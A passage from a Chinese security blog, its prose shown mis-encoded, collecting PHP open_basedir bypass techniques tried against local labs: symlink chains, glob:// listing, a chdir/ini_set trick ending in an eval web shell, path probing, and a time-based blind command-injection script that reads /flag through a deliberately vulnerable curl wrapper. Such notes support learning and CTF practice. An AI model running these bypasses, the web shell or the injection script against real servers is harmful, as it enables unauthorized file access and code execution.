<h3 id="0x03-åˆ©ç”¨symlink-æ„é€ è½¯é“¾æ¥"><a href="#0x03-åˆ©ç”¨symlink-æ„é€ è½¯é“¾æ¥" class="headerlink" title="0x03 åˆ©ç”¨symlink()æ„é€ è½¯é“¾æ¥"></a>0x03 åˆ©ç”¨symlink()æ„é€ è½¯é“¾æ¥</h3><blockquote>
<p> è¿™ä¸ªåœ¨å­¦ä¹ è¿‡ç¨‹ä¸­,æ„Ÿè§‰è¿˜æ˜¯å¾ˆæœ‰è¶£çš„</p>
</blockquote>
<p><code>symlink()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">symlink ( string $target , string $link ) : bool</span><br></pre></td></tr></table></figure>

<p><strong>symlink()</strong> creates a symbolic link to the existing <code>target</code> with the specified name <code>link</code>.</p>
<p>å½“å‰<code>symlink.php</code> çš„åœ°å€ä¸º<code>/mnt/d/phpstudy_pro/WWW/test/2020_11_4_bypass_open_basedir</code>,è€Œ flag ä½äº<code>/flag</code></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/mnt/d/phpstudy_pro/WWW/test/2020_11_4_bypass_open_basedir&#x27;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;D&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;E&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;F&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;F&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;G&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;G&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;A/B/C/D/E/F/G&quot;</span>,<span class="string">&quot;7ea&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ä¸ºäº†ä¾¿äº å¯ä»¥å°† è¯¥7ea æ ‡è®°ä¸º7ea_first </span></span><br><span class="line"><span class="comment">ç¬¬ä¸€æ¬¡åˆ›å»ºçš„7eaåœ°å€æ˜¯æŒ‡å‘A/B/C/D/E/F/G</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">symlink(<span class="string">&quot;7ea/../../../../../../../flag&quot;</span>,<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;7ea&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;7ea&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¯¥ 7ea æ ‡è®°ä¸º 7ea_second</span></span><br><span class="line"><span class="comment">é‡æ–°æŒ‡å‘7ea/../../../../../../../flag</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x04åˆ©ç”¨glob-ä¼ªåè®®"><a href="#0x04åˆ©ç”¨glob-ä¼ªåè®®" class="headerlink" title="0x04åˆ©ç”¨glob://ä¼ªåè®®"></a>0x04åˆ©ç”¨glob://ä¼ªåè®®</h3><p>glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼,è‡ª PHP 5.3.0 èµ·å¼€å§‹æœ‰æ•ˆã€‚</p>
<table>
<thead>
<tr>
<th align="left">å±æ€§</th>
<th align="left">æ”¯æŒ</th>
</tr>
</thead>
<tbody><tr>
<td align="left">å—é™äº <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen">allow_url_fopen</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">å—é™äº <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include">allow_url_include</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">å…è®¸è¯»å–</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">å…è®¸å†™å…¥</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">å…è®¸é™„åŠ </td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">å…è®¸åŒæ—¶è¯»å†™</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">æ”¯æŒ <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.stat.php">stat()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">æ”¯æŒ <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unlink.php">unlink()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">æ”¯æŒ <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.rename.php">rename()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">æ”¯æŒ <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mkdir.php">mkdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">æ”¯æŒ <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.rmdir.php">rmdir()</a></td>
<td align="left">No</td>
</tr>
</tbody></table>
<p>ç¤ºä¾‹ä½¿ç”¨:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///mnt/d/phpstudy_pro/WWW/test/2020_11_4_bypass_open_basedir/*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    printf(<span class="string">&quot;%s: %.1FK\n&quot;</span>, $f-&gt;getFilename(), $f-&gt;getSize()/<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt; php glob_php_demo.php</span></span><br><span class="line"><span class="comment">glob_php_demo.php: 0.2K</span></span><br><span class="line"><span class="comment">symlink.php: 0.7K</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="0x01-DirectoryIterator-glob"><a href="#0x01-DirectoryIterator-glob" class="headerlink" title="0x01 DirectoryIterator+glob://"></a>0x01 DirectoryIterator+glob://</h4><p>DirectoryIteratoræ˜¯php5ä¸­å¢åŠ çš„ä¸€ä¸ªç±»ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç®€å•çš„æŸ¥çœ‹ç›®å½•çš„æ¥å£ã€‚</p>
<p>DirectoryIteratorä¸glob://ç»“åˆå°†æ— è§†open_basedirï¼Œåˆ—ä¸¾å‡ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/class.directoryiterator.php">https://www.php.net/manual/en/class.directoryiterator.php</a> </p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/app&#x27;</span>);</span><br><span class="line">$c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>($c);</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å®è·µä¸­å‘ç°å¯ä»¥åšåˆ°ä»»æ„ç›®å½•è¯»å–</p>
<p>å¯¹mi1k7eaå¸ˆå‚…æåˆ°çš„å—é™é—®é¢˜å­˜ç–‘</p>
</blockquote>
<h4 id="0x02-opendir-readdir-glob"><a href="#0x02-opendir-readdir-glob" class="headerlink" title="0x02 opendir()+readdir()+glob://"></a>0x02 opendir()+readdir()+glob://</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/app&#x27;</span>);</span><br><span class="line">$a = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( $b = opendir($a) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ($file = readdir($b)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $file.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">payload </span></span><br><span class="line"><span class="comment">http://localhost:40080/glob/glob_opendir_readdir.php?c=glob:///*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x05-åˆ©ç”¨chdir-ä¸ini-set-ç»„åˆBypass"><a href="#0x05-åˆ©ç”¨chdir-ä¸ini-set-ç»„åˆBypass" class="headerlink" title="0x05 åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass"></a>0x05 åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">ä»PHPåº•å±‚çœ‹open_basedir bypass</a></p>
<blockquote>
<p>æ¨èçœ‹ä¸€ä¸‹</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/app&#x27;</span>);</span><br><span class="line">mkdir(<span class="string">&#x27;fe1w0&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;fe1w0&#x27;</span>);</span><br><span class="line"><span class="comment">//  path  /app/glob/fe1w0</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="comment">// go back 3 times</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="number">1</span>];</span><br><span class="line">@<span class="keyword">eval</span>($cmd);</span><br></pre></td></tr></table></figure>

<h3 id="0x06-åˆ©ç”¨bindtextdomain"><a href="#0x06-åˆ©ç”¨bindtextdomain" class="headerlink" title="0x06 åˆ©ç”¨bindtextdomain()"></a>0x06 åˆ©ç”¨bindtextdomain()</h3><p>bindtextdomain ( string <code>$domain</code> , string <code>$directory</code> ) : string</p>
<p>The <strong>bindtextdomain()</strong> function sets the path for a domain.</p>
<blockquote>
<p>ç»‘å®šåŸŸåä¸è·¯å¾„</p>
</blockquote>
<p>return:</p>
<p>The full pathname for the <code>domain</code> currently being set.</p>
<p>bypass åŸç†:<br>åˆ©ç”¨bindtextdomainåœ¨æˆåŠŸç»‘å®šåŸŸåå’Œç›®å½•ä¹‹å,ä¼šè¿”å›å®Œæ•´åœ°å€ã€‚å¦‚æœåœ°å€ä¸å­˜åœ¨,åˆ™<code>return false</code>,å¥½åƒä¹Ÿåªèƒ½æ¢æµ‹ç›®å½•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/app&#x27;</span>);</span><br><span class="line">$domain = <span class="string">&#x27;docker&#x27;</span>;</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$res=bindtextdomain($domain, $file);</span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure>

<h3 id="0x07-åˆ©ç”¨SplFileInfo-getRealPath-ç±»æ–¹æ³•"><a href="#0x07-åˆ©ç”¨SplFileInfo-getRealPath-ç±»æ–¹æ³•" class="headerlink" title="0x07 åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•"></a>0x07 åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.splfileinfo.php">SplFileinfo</a></p>
<blockquote>
<p>The SplFileInfo class offers a high-level object oriented interface to information for an individual file.</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/splfileinfo.getrealpath.php">SplFileInfo::getRealPath</a></p>
<blockquote>
<p>SplFileInfo::getRealPath â€” Gets absolute path to file</p>
<p>return</p>
<p>Returns the path to the file, or <strong><code>FALSE</code></strong> if the file does not exist.</p>
</blockquote>
<p>å…·ä½“ä½¿ç”¨å’Œbindtextdomainä¸€æ ·</p>
<p>åˆ©ç”¨<code>SplFileInfo::getRealPath()</code>ä¼šæ ¹æ®è¾“å…¥åœ°å€,æ”¾å›ç»å¯¹åœ°å€,å­˜åœ¨åˆ™è§£æã€‚å¦‚æœåœ°å€ä¸å­˜åœ¨,åˆ™<code>return false</code>,å’Œ<code>bindtextdomain</code>åªèƒ½æ¢æµ‹ç›®å½•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/app&#x27;</span>);</span><br><span class="line">$info = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>($_GET[<span class="string">&#x27;file_name&#x27;</span>]);</span><br><span class="line">var_dump($info-&gt;getRealPath());</span><br></pre></td></tr></table></figure>

<h3 id="0x08-realpath"><a href="#0x08-realpath" class="headerlink" title="0x08 realpath()"></a>0x08 realpath()</h3><blockquote>
<p><strong>realpath()</strong> æ‰©å±•æ‰€æœ‰çš„ç¬¦å·è¿æ¥å¹¶ä¸”å¤„ç†è¾“å…¥çš„ <code>path</code> ä¸­çš„ â€˜/./â€˜, â€˜/../â€˜ ä»¥åŠå¤šä½™çš„ â€˜/â€˜ å¹¶è¿”å›è§„èŒƒåŒ–åçš„ç»å¯¹è·¯å¾„åã€‚è¿”å›çš„è·¯å¾„ä¸­æ²¡æœ‰ç¬¦å·è¿æ¥ï¼Œâ€™/./â€˜ æˆ– â€˜/../â€˜ æˆåˆ†ã€‚</p>
</blockquote>
<p>ç¯å¢ƒæ¡ä»¶ï¼šWindows</p>
<p>åŸºæœ¬åŸç†æ˜¯åŸºäºæŠ¥é”™è¿”å›å†…å®¹çš„ä¸ç”¨ï¼Œè®¾ç½®è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¾ªç¯éå†åŒ¹é…åˆ°æ­£åˆ™çš„æŠ¥é”™ä¿¡æ¯çš„å­—ç¬¦æ¥é€ä¸ªæ‹¼æ¥æˆå­˜åœ¨çš„æ–‡ä»¶åï¼Œå¦å¤–æ˜¯éœ€è¦ç»“åˆåˆ©ç”¨Windowsä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„é€šé…ç¬¦&lt;å’Œ&gt;ï¼Œä¸ç„¶åªèƒ½è¿›è¡Œæš´ç ´ã€‚</p>
<blockquote>
<p>from mi1k7eaå¸ˆå‚…</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">set_error_handler(<span class="string">&#x27;isexists&#x27;</span>);</span><br><span class="line">$dir = <span class="string">&#x27;E:/wamp64/&#x27;</span>;</span><br><span class="line">$file = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123;</span><br><span class="line">        $file = $dir . $chars[$i] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;</span><br><span class="line">        realpath($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params">$errno, $errstr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $regexp = <span class="string">&#x27;/File\((.*)\) is not within/&#x27;</span>;</span><br><span class="line">        preg_match($regexp, $errstr, $matches);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">                printf(<span class="string">&quot;%s &lt;br/&gt;&quot;</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="shell-è„šæœ¬"><a href="#shell-è„šæœ¬" class="headerlink" title="shell è„šæœ¬"></a>shell è„šæœ¬</h2><h3 id="å»¶æ—¶è„šæœ¬"><a href="#å»¶æ—¶è„šæœ¬" class="headerlink" title="å»¶æ—¶è„šæœ¬"></a>å»¶æ—¶è„šæœ¬</h3><p>åˆ©ç”¨sqliä¸­å»¶æ—¶æ³¨å…¥(å½“ç„¶å¯ä»¥å¸ƒå°”)çš„æƒ³æ³•,æ— å›æ˜¾è¯»å–flag</p>
<blockquote>
<p>è¿™é‡Œæœ‰ä¸ªå‘ç‚¹,åœ¨dash ä¸­ä¸æ”¯æŒ {$flag:0:1}è¿™æ ·çš„å­—ç¬¦ä¸²æˆªå–æ–¹å¼,æ‰€ä»¥æˆ‘è¿™è¾¹æ˜¯å°†<code>/bin/sh</code> è½¯é“¾æ¥äº†<code>/bin/bash</code></p>
<p>è‹¥å¸ˆå‚…æœ‰å¯ä»¥åœ¨<code>/bin/sh</code>ä¸‹çš„æ–¹æ¡ˆæˆ–æ›´å¥½çš„è„šæœ¬,æœ›åˆ†äº«ğŸ‘</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://localhost:40080/2020_11_6_no_echo_shell/demo_curl.php?url=127.0.0.1;&#x27;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(0,20):</span><br><span class="line">    for j in string.printable:</span><br><span class="line">        payload = &#x27;&#x27;&#x27;flag=$(cat /flag);if [ &quot;$&#123;flag:%s:1&#125;&quot; = &quot;%s&quot; ];then sleep 3;fi&#x27;&#x27;&#x27; %(i,j)</span><br><span class="line">        url_second = url+payload</span><br><span class="line">        #print(url_second)</span><br><span class="line">        try:</span><br><span class="line">            res = requests.get(url_second,timeout=2)</span><br><span class="line">        except:</span><br><span class="line">            flag+=j</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>demo_curl.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = $_REQUEST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="comment">#echo &quot;your input url is &quot;.$url;</span></span><br><span class="line">system(<span class="string">&quot;curl &quot;</span>.$url);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag=$(cat /flag);if [ &quot;$&#123;flag:1:1&#125;&quot; = &quot; &quot; ];then sleep 3;fi</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>è¿™ç¯‡æ–‡ç« ä¸ªäººä½¿ç”¨,å› ä¸ºå¾ˆå¤šå†…å®¹,æˆ‘æ˜¯ç›´æ¥copyçš„,å¹¶ä¸èƒ½ç®—è‡ªå·±å†™çš„ã€‚</p>
<p>TODO:</p>
<ul>
<li>php-fuck</li>
<li>serialize</li>
<li>åè®®è§£æäº§ç”Ÿçš„é—®é¢˜</li>
</ul>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>åŸæ–‡ä½œè€…ï¼š<a href="https://fe1w0.github.io">fe1w0</a>
            <p>åŸæ–‡é“¾æ¥ï¼š<a href="https://fe1w0.github.io/2020/11/15/php_%E5%AE%89%E5%85%A8%E6%9D%82%E8%AE%B0/">https://fe1w0.github.io/2020/11/15/php_%E5%AE%89%E5%85%A8%E6%9D%82%E8%AE%B0/</a>
            <p>å‘è¡¨æ—¥æœŸï¼š<a href="https://fe1w0.github.io/2020/11/15/php_%E5%AE%89%E5%85%A8%E6%9D%82%E8%AE%B0/">November 15th 2020, 4:58:29 pm</a>
            <p>æ›´æ–°æ—¥æœŸï¼š<a href="https://fe1w0.github.io/2020/11/15/php_%E5%AE%89%E5%85%A8%E6%9D%82%E8%AE%B0/">March 15th 2021, 12:15:42 am</a>
            <p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡é‡‡ç”¨<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨ 4.0 å›½é™…è®¸å¯åè®®</a>è¿›è¡Œè®¸å¯</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2020/11/15/2020%E5%B9%B4%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B%E6%9A%A8%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" title= "2020å¹´å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ›æš¨ç¬¬å…­å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›">
                    <div class="nextTitle">2020å¹´å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ›æš¨ç¬¬å…­å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2020/10/16/%E5%A4%A9%E5%88%9B%E6%9D%AF/" title= "å¤©åˆ›æ¯">
                    <div class="prevTitle">å¤©åˆ›æ¯</div>
                </a>
            
        </li>
    </ul>
    <!-- è¯„è®ºæ’ä»¶ -->
    <!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->

    <div id="lv-container" data-id="city" data-uid= MTAyMC80ODYzMS8yNTEyNQ==>
        <script type="text/javascript">
            (function (d, s) {
                var j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') { return; }
                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>ä¸ºæ­£å¸¸ä½¿ç”¨æ¥å¿…åŠ›è¯„è®ºåŠŸèƒ½è¯·æ¿€æ´»JavaScript</noscript>
    </div>

<!-- Cityç‰ˆå®‰è£…ä»£ç å·²å®Œæˆ -->
    
    
    <!-- gitalkè¯„è®º -->

    <!-- utterancè¯„è®º -->

    <!-- partial('_partial/comment/changyan') -->
    <!--PCç‰ˆ-->


    
    

    <!-- è¯„è®º -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:xzasliuxinrong@gmail.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/xzlxr" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                  
                  <img class="profile-qr" src="/assets/example_qr.png" />
                </span>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="https://steamcommunity.com/id/xzlxr/" class="iconfont-archer steam" target="_blank" title=steam></a>
            
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
            
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
